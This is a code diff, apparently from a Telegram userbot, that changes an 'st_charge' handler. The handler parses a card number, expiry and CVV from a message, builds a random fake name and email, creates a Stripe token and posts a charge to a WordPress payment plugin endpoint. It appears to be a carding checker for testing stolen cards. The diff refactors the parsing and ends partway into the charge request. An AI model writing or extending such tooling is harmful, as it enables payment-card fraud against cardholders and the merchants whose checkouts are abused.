@@ -2,6 +2,7 @@ import httpx
 import string
 import random
 import time
+import re
 
 from datetime import datetime
 from telethon import events
@@ -14,15 +15,15 @@ async def st_charge(event):
     reply_msg = await event.get_reply_message()
     if reply_msg:
         cc = reply_msg.message
+    x = re.findall(r'\d+', cc)
+    ccn = x[0]
+    mm = x[1]
+    yy = x[2]
+    cvv = x[3]
     VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '65', '6011')
-    if not cc.startswith(VALID):
+    if not ccn.startswith(VALID):
         return await event.edit('**Invalid CC Type**')
     start = time.time()
-    splitter = cc.split('|')
-    ccn = splitter[0]
-    mm = splitter[1]
-    yy = splitter[2]
-    cvv = splitter[3]
 
     letters = string.ascii_lowercase
     First = ''.join(random.choice(letters) for i in range(6))
@@ -30,8 +31,6 @@ async def st_charge(event):
     Name = f'{First}+{Last}'
     Email = f'{First}.{Last}@gmail.com'
     VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '65', '6011')
-    if not cc.startswith(VALID):
-        return await event.edit('**Invalid CC Type**')
 
     async with httpx.AsyncClient() as client:
         headers = {
@@ -64,11 +63,11 @@ async def st_charge(event):
             "accept-language": "en-US,en;q=0.9"
             }
 
-        re = await client.post('https://api.stripe.com/v1/tokens',
+        resq = await client.post('https://api.stripe.com/v1/tokens',
                                data=payload, headers=head)
-        Id = re.json()['id']
-        Country = re.json()['card']['country']
-        Brand = re.json()['card']['brand']
+        Id = resq.json()['id']
+        Country = resq.json()['card']['country']
+        Brand = resq.json()['card']['brand']
 
         load = {
           "action": "wp_full_stripe_payment_charge",
